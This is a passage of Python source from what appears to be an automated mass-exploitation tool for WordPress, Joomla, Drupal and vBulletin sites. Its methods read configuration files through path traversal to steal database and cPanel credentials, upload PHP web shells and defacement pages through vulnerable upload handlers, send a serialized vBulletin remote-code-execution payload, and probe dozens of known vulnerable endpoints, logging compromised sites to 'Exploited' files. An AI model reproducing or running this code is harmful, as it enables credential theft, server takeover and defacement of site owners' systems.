                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
                                     0] + '\n---------------------\n')
                except:
                    self.Print_NotVuln('TheLoft', site)
            else:
                self.Print_NotVuln('TheLoft', site)
        except:
            self.Print_NotVuln('TheLoft', site)

    def cpanel(self, site):
        try:
            Exp = 'http://' + site + \
                  'wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'user=(.*)' in GetConfig.text:
                self.Print_vuln_Config(site)
                try:
                    Getuser = re.findall("'user', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'password', '(.*)'", GetConfig.text)
                    with open('Exploited/Cpanel.txt', 'a') as ww:
                        ww.write('Cpanel Path  : ' + site + '  user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + '\n---------------------\n')
                except:
                    self.Print_NotVuln('cpanel', site)
            else:
                self.Print_NotVuln('cpanel', site)
        except:
            self.Print_NotVuln('cpanel', site)

    def Com_extplorer(self, site):
        Check = requests.get('http://' + site + '/administrator/components/com_extplorer/uploadhandler.php',
                             timeout=10, headers=self.Headers)
        if Check.status_code == 200 or Check.status_code == 500:
            IndeX = {'Filedata': open(self.Jce_Deface_image, 'rb')}

            ShellFile = {'Filedata': open(self.ShellPresta, 'rb')}
            requests.post('http://' + site + '/administrator/components/com_extplorer/uploadhandler.php',
                                files=ShellFile, timeout=10, headers=self.Headers)
            CheckShell = requests.get('http://' + site +
                                      '/images/stories/up.php', timeout=5, headers=self.Headers)

            if 'MisterSpyv7up' in CheckShell.text:
                self.Print_vuln_Shell(site + '/images/stories/up.php')
                with open('Exploited/Shells.txt', 'a') as writer:
                    writer.write(site + '/images/stories/up.php\n')
            else:
                requests.post('http://' + site + '/administrator/components/com_extplorer/uploadhandler.php',
                              files=IndeX, timeout=10, headers=self.Headers)

                CheckIndex = requests.get('http://' + site + '/images/stories/' + self.Jce_Deface_image.split('/')[1],
                                          headers=self.Headers, timeout=10)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_extplorer', site)
        else:
            self.Print_NotVuln('Com_extplorer', site)

    def Com_jwallpapers_index(self, site):
        try:
            fileindex = {'file': open(self.Jce_Deface_image, 'rb')}
            post_data = {"name": self.Jce_Deface_image.split('/')[1],
                         "submit": "Upload"}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5, headers=self.Headers)
            if '"jsonrpc"' in GoT.text:
                Check = requests.get('http://' + site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1],
                                     timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in Check.text:
                    self.Print_Vuln_index(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/tmp/plupload/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_jwallpapers', site)
        except:
            self.Print_NotVuln('Com_jwallpapers', site)

    def Com_jwallpapers_Shell(self, site):
        try:
            fileindex = {'file': open(self.indeX, 'rb')}
            post_data = {"name": "vuln.php",
                         "submit": "Upload"}
            Exp = 'http://' + site + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
            GoT = requests.post(Exp, files=fileindex, data=post_data, timeout=5, headers=self.Headers)
            if '"jsonrpc"' in GoT.text:
                requests.post(Exp, files=fileindex, data={"name": "vuln.phP"}, timeout=5, headers=self.Headers)
                requests.post(Exp, files=fileindex, data={"name": "vuln.phtml"}, timeout=5, headers=self.Headers)
                Check = requests.get('http://' + site + '/tmp/plupload/vuln.php', timeout=5, headers=self.Headers)
                Check2 = requests.get('http://' + site + '/tmp/plupload/vuln.phP', timeout=5, headers=self.Headers)
                Check3 = requests.get('http://' + site + '/tmp/plupload/vuln.phtml', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                CheckShell = requests.get('http://' + site + '/images/vuln.php', timeout=5, headers=self.Headers)

                if 'MrSpyUp!!' in Check.text:
                    if 'SpyUploaderV1' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Com_jwallpapers_index(site)
                elif 'MrSpyUp!!' in Check2.text:
                    if 'SpyUploaderV1' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Com_jwallpapers_index(site)
                elif 'MrSpyUp!!' in Check3.text:
                    if 'SpyUploaderV1' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/images/vuln.php')
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(site + '/images/vuln.php' + '\n')
                    if 'spy0xProjectTop50' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('Exploited/Index.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Com_jwallpapers_index(site)
                else:
                    self.Com_jwallpapers_index(site)
        except:
            self.Com_jwallpapers_index(site)


    def Com_facileforms(self, site):
        Check = requests.get('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                             timeout=10, headers=self.Headers)
        if Check.status_code == 200 or Check.status_code == 500:
            IndeX = {'Filedata': open(self.Jce_Deface_image, 'rb')}
            ShellFile = {'Filedata': open(self.ShellPresta, 'rb')}
            Datapost = {'folder': '/components/com_facileforms/libraries/jquery/'}
            requests.post('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                                files=ShellFile, data=Datapost, timeout=10, headers=self.Headers)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_facileforms/libraries/jquery/up.php',
                                      timeout=5, headers=self.Headers)
            if 'SpyUploaderV1' in CheckShell.text:
                self.Print_vuln_Shell(site + '/components/com_facileforms/libraries/jquery/up.php')
                with open('Exploited/Shells.txt', 'a') as writer:
                    writer.write(site + '/components/com_facileforms/libraries/jquery/up.php\n')
            else:
                requests.post('http://' + site + '/components/com_facileforms/libraries/jquery/uploadify.php',
                              files=IndeX, data=Datapost, timeout=10, headers=self.Headers)

                CheckIndex = requests.get('http://' + site + '/components/com_facileforms/libraries/jquery/'
                                          + self.Jce_Deface_image.split('/')[1], headers=self.Headers, timeout=10)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/components/com_facileforms/libraries/jquery/'
                                          + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/components/com_facileforms/libraries/jquery/'
                                     + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_facileforms', site)
        else:
            self.Print_NotVuln('Com_facileforms', site)

    def barclaycart(self, site):
        try:
            ShellFile = {'Filedata': (self.pagelinesExploitShell, open(self.pagelinesExploitShell, 'rb')
                                  , 'multipart/form-data')}
            Exp = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/uploadify.php'
            requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
            Shell = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/' \
                    + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(Shell, timeout=5, headers=self.Headers)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'MrSpyUp!!' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('Exploited/Shells.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'spy0xProjectTop50' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('barclaycart plugin', site)
            else:
                self.Print_NotVuln('barclaycart plugin', site)
        except:
            self.Print_NotVuln('barclaycart plugin', site)

    def Com_s5_media_playerx(self, site):
        try:
            Exp = 'http://' + site + \
                  '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_s5_media_player',site)
            else:
                pass
        except:
            pass
    def Com_Hdflvplayerx(self, site):
        try:
            Exp = 'http://' + site + \
                  '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Com_Hdflvplayer',site)
            else:
                pass
        except:
            pass
    def Drupal_Bartik(self, site):
        try:
            Exp = 'http://' + site +'/themes/bartik/templates/page.tpl.php?=fileupload&method=ajax_upload'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Drupal_Bartik',site)
            else:
                pass
        except:
            pass
    def kcfind(self, site):
        try:
         mega=['/assets/ckeditor/kcfinder/upload.php','/assets/admin/ckeditor/kcfinder/upload.php','admin/ckeditor/kcfinder/upload.php','/libraries/jscripts/kcfinder/upload.php','/ckeditor/kcfinder/upload.php','/js/ckeditor/kcfinder/upload.php','/scripts/jquery/kcfinder/upload.php','/kcfinder-2.51/upload.php','/assets/js/mylibs/kcfinder/upload.php']
         for i in mega:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('kcfind',site)
            else:
                pass
        except:
            pass
    def Vbulletin_RCE5(self, site):
        try:
            Exp = 'http://' + site +'/ajax/api/hook/decodeArguments?arguments=O%3A12%3A"vB_dB_Result"%3A2%3A%7Bs%3A5%3A"%00%2A%00db"%3BO%3A11%3A"vB_Database"%3A1%3A%7Bs%3A9%3A"functions"%3Ba%3A1%3A%7Bs%3A11%3A"free_result"%3Bs%3A7%3A"phpinfo"%3B%7D%7Ds%3A12%3A"%00%2A%00recordset"%3Bi%3A1%3B%7D'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Vbulletin_RCE5',site)
            else:
                pass
        except:
            pass
    def vehiculo_photos(self, site):
        try:
         for i in ['/adminside/server/php/','/vehiculo_photos/server/php/','/tpl/plugins/upload9.1.0/server/php/','/themes/dashboard/assets/plugins/jquery-file-upload/server/php/']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if 'files[]'in Check.text.encoded('utc-8') or Check.status_code == 200:
                self.printor('vehiculo_photos',site)
            else:
                pass
        except:
            pass
    def FilesUpp(self, site):
        try:
            Exp = 'http://' + site +'/public/upload_nhieuanh/server/php/_index.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('FilesUpp',site)
            else:
                pass
        except:
            pass
    def tinymce(self, site):
        try:
         for i in ['/admin/tinymce/jscripts/tiny_mce/plugins/imgsurfer/main.php','/tinymce/jscripts/tiny_mce/plugins/imgsurfer/main.php','/tinymce/plugins/imgsurfer/main.php','/public/js/plugins/imgsurfer/main.php','/app/webroot/js/tinymce/plugins/imgsurfer/main.php','/assets/tinymce/plugins/imgsurfer/main.php','/templates/admin/js/tinymce/plugins/imgsurfer/main.php']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('tinymce',site)
            else:
                pass
        except:
            pass    
    def Ajaxfilemanager1(self, site):
        try:
         for i in['/tinymce/plugins/ajaxfilemanager/ajax_create_folder.php','/helpdesk/media/editor/plugins/filemanager/ajax_create_folder.php','/media/editor/plugins/filemanager/ajax_create_folder.php','/editor/plugins/filemanager/ajax_create_folder.php','/admin/editor/plugins/filemanager/ajax_create_folder.php','/scripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php','/modul/tinymce/plugins/ajaxfilemanager/ajax_create_folder.php','/admin/libraries/ajaxfilemanager/ajax_create_folder.php','/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Ajaxfilemanager',site)
            else:
                pass
        except:
            pass
    def Arrayfil(self, site):
        try:
            Exp = 'http://' + site +'/server/php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Arrayfil',site)
            else:
                pass
        except:
            pass
    def jquery(self, site):
        try:
            Exp = 'http://' + site +'/assets/global/plugins/jquery-file-upload/server/php/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('jquery',site)
            else:
                pass
        except:
            pass
    def PhotoStore(self, site):
        try:
         for i in ['/assets/uploadify/uploadify.php','/assets/uploadify/old/uploadify.php']:
            Exp = 'http://' + site +i
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('PhotoStore',site)
            else:
                pass
        except:
            pass
    def cfg_contactform(self, site):
        try:
            Exp = 'http://' + site +'/cfg-contactform-1/inc/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('cfg_contactform',site)
            else:
                pass
        except:
            pass
    def PHP_Fusion(self, site):
        try:
            Exp = 'http://' + site +'/infusions/mp3player_panel/upload.php?folder=/infusions/mp3player_panel/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('PHP_Fusion',site)
            else:
                pass
        except:
            pass    
    def uploadifyamazons3(self, site):
        try:
            Exp = 'http://' + site +'/files/uploadify/uploadify.php?folder=/files/uploadify/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('uploadify-amazon-s3',site)
            else:
                pass
        except:
            pass
    def umapresence(self, site):
        try:
            Exp = 'http://' + site +'/umapresence/umaservices/umapage/inc/contentCss.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('umapresence',site)
            else:
                pass
        except:
            pass
    def TikiWiki(self, site):
        try:
            Exp = 'http://' + site +'/vendor_extra/elfinder/php/connector.minimal.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('TikiWiki',site)
            else:
                pass
        except:
            pass
    def Wordpressinstaller(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/install.php?step=1'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Wordpressinstaller',site)
            else:
                pass
        except:
            pass    
    def betheme(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/betheme/muffin-options/fields/upload/field_upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('betheme',site)
            else:
                pass
        except:
            pass
    def woopraRCE(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/woopra/inc/php-ofc-library/ofc_upload_image.php?name=xxb.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('woopraRCE',site)
            else:
                pass
        except:
            pass
    def invit0r(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/invit0r/lib/tmp-upload-images/xxb.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('invit0r',site)
            else:
                pass
        except:
            pass
    def formidable(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/formidable/pro/js/tmp-upload-images/xxb.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('formidable',site)
            else:
                pass
        except:
            pass
    def evarisk(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/evarisk/include/lib/actionsCorrectives/activite/xxb.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('evarisk',site)
            else:
                pass
        except:
            pass
    def wpslimstatRCE(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/wp-slimstat-ex/lib/ofc/php-ofc-library/ofc_upload_image.php?name=xxb.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('wpslimstatRCE',site)
            else:
                pass
        except:
            pass    
    def completeGalleryManager(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/complete-gallery-manager/frames/upload-images.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('completeGalleryManager',site)
            else:
                pass
        except:
            pass
    def ShoppingCart(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/levelfourstorefront/scripts/administration/dbuploaderscript.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('ShoppingCart',site)
            else:
                pass
        except:
            pass
    def auctionPlugin(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/auctionPlugin/uploadify/upload.php?folder=/wp-content/uploads/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('auctionPlugin',site)
            else:
                pass
        except:
            pass
    def area53(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/area53/framework/_scripts/valums_uploader/php.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('area53',site)
            else:
                pass
        except:
            pass    
    def utstrange(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/ut-strange/addpress/includes/ap_fileupload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('utstrange',site)
            else:
                pass
        except:
            pass
    def ThisWay(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('ThisWay',site)
            else:
                pass
        except:
            pass
    def theagency(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/theagency/includes/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('theagency',site)
            else:
                pass
        except:
            pass
    def switchblade(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/switchblade/framework/_scripts/valums_uploader/php.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('switchblade',site)
            else:
                pass
        except:
            pass
    def atom(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/atom/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('atom',site)
            else:
                pass
        except:
            pass
    def purevision(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('purevision',site)
            else:
                pass
        except:
            pass    
    def magnitudo(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/magnitudo/framework/_scripts/valums_uploader/php.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('magnitudo',site)
            else:
                pass
        except:
            pass
    def cubed_v1dot2(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/cubed_v1.2/functions/upload-handler.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('cubed_v1dot2',site)
            else:
                pass
        except:
            pass
    def RightNow(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('RightNow',site)
            else:
                pass
        except:
            pass
    def Tevolution(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Tevolution',site)
            else:
                pass
        except:
            pass    
    def html5avmanager(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/html5avmanager/lib/uploadify/custom.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('html5avmanager',site)
            else:
                pass
        except:
            pass
    def dzsvideowhisper(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/dzs-videowhisper/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('dzsvideowhisper',site)
            else:
                pass
        except:
            pass
    def galleryversion(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/contus-video-galleryversion-10/upload1.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('galleryversion',site)
            else:
                pass
        except:
            pass
    def konzept(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/konzept/includes/uploadify/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('konzept',site)
            else:
                pass
        except:
            pass    
    def Seowatcher(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/seo-watcher/ofc/php-ofc-library/ofc_upload_image.php?name=test.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Seowatcher',site)
            else:
                pass
        except:
            pass
    def omnisecurefil(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/omni-secure-files/plupload/examples/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('omnisecurefil',site)
            else:
                pass
        except:
            pass
    def pitchprint(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/pitchprint/uploader/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('pitchprint',site)
            else:
                pass
        except:
            pass
    def satoshi(self, site):
        try:
            Exp = 'http://' + site +'wp-content/themes/satoshi/upload-file.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('satoshi',site)
            else:
                pass
        except:
            pass
    def radialth(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/radial-theme/functions/upload-handler.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('radialth',site)
            else:
                pass
        except:
            pass
    def pinboard(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('pinboard',site)
            else:
                pass
        except:
            pass   
    def wpstorecart(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/wpstorecart/php/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('wpstorecart',site)
            else:
                pass
        except:
            pass
    def armyknife(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/armyknife/functions/upload-handler.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('armyknife',site)
            else:
                pass
        except:
            pass
    def assetmanager(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/asset-manager/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('assetmanager',site)
            else:
                pass
        except:
            pass
    def evolve(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('evolve',site)
            else:
                pass
        except:
            pass
    def acffrontenddisplay(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('acffrontenddisplay',site)
            else:
                pass
        except:
            pass
    def designfolioplus(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/designfolio-plus/admin/upload-file.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('designfolioplus',site)
            else:
                pass
        except:
            pass
    def Learndash(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/uploads/assignments/ms-sitemple.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Learndash',site)
            else:
                pass
        except:
            pass    
    def MarketPlace(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin-post.php?task=wpmp_upload_previews'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('MarketPlace',site)
            else:
                pass
        except:
            pass
    def uploaderplug(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/uploader/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('uploaderplug',site)
            else:
                pass
        except:
            pass
    def wpproperty(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('wpproperty',site)
            else:
                pass
        except:
            pass
    def socialnetwork(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('socialnetwork',site)
            else:
                pass
        except:
            pass    
    def magicfields(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('magicfields',site)
            else:
                pass
        except:
            pass
    def custombackground(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/custom-background/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('custombackground',site)
            else:
                pass
        except:
            pass
    def ecstatic(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/ecstatic/'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('ecstatic',site)
            else:
                pass
        except:
            pass
    def customtshirtdesigner(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-deep-gray/designit/cs/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('customtshirtdesigner',site)
            else:
                pass
        except:
            pass
    def qualifire(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('qualifire',site)
            else:
                pass
        except:
            pass
    def boxit(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/boxit/upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('boxit',site)
            else:
                pass
        except:
            pass    
    def Ghostth(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Ghostth',site)
            else:
                pass
        except:
            pass
    def Coldfusion(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/Coldfusion/includes/uploadify/upload_settings_image.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Coldfusion',site)
            else:
                pass
        except:
            pass
    def simplecart(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/wp-simple-cart/request/simple-cart-upload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('simplecart',site)
            else:
                pass
        except:
            pass
    def ninetofive(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/ninetofive/scripts/doajaxfileupload.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('ninetofive',site)
            else:
                pass
        except:
            pass    
    def JsorSliders(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('JsorSliders',site)
            else:
                pass
        except:
            pass
    def clockstone(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/themes/clockstone/theme/functions/uploadbg.php'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('clockstone',site)
            else:
                pass
        except:
            pass
    def Blaze(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=blaze_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Blaze',site)
            else:
                pass
        except:
            pass
    def Catpro(self, site):
        try:
            Exp = 'http://' + site +'/wp-admin/admin.php?page=catpro_manage'
            Check = requests.get(Exp, timeout=5)
            if Check.status_code == 200:
                self.printor('Catpro',site)
            else:
                pass
        except:
            pass
    def downloadsmanagr(self, site):
        try:
            Exp = 'http://' + site +'/wp-content/plugins/downloads-manager/readme.txt'
